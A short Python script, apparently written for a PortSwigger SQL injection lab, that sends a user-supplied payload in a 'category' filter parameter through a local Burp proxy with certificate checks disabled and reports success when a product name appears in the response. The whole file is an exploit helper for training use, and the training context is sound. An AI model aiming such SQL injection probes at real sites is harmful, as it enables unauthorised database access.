import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError: 
        print("Wrong number of parameters!!")
        print("Usage: python3 ps_lab1.py <url> <payload>")
        sys.exit(-1)

    def exploit_sqli(url, payload):
        uri = '/filter?category='
        r = requests.get(url + uri + payload, verify = False, proxies = proxies)
        if "Eye Projectors" in r.text:
            return True
        else: 
            return False

#now we check the return of the injection status function: 
    if exploit_sqli(url, payload): 
        print("SQL injection successful!")
    else: 
        print("SQL injection unseccuessful")
        